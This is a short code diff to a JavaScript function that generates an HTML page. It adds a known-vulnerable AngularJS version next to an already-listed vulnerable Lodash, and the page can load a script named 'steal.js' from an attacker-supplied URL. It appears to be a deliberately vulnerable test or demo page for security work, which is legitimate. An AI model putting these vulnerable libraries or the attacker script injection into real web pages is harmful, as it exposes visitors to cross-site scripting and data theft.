@@ -70,6 +70,8 @@ function getHtml(attackerUrl, injectScript = true) {
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <!-- Vulnerable: Lodash 4.17.10 - CVE-2018-3721, CVE-2019-10744 (prototype pollution) -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.17.10/lodash.min.js"></script>
+  <!-- Vulnerable: AngularJS 1.6.9 - CVE-2019-10768 (XSS), CVE-2020-7676 (XSS), CVE-2021-32820 (XSS) -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.9/angular.min.js"></script>
   ${injectScript ? `<script src="${attackerUrl}/steal.js"></script>` : ''}
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
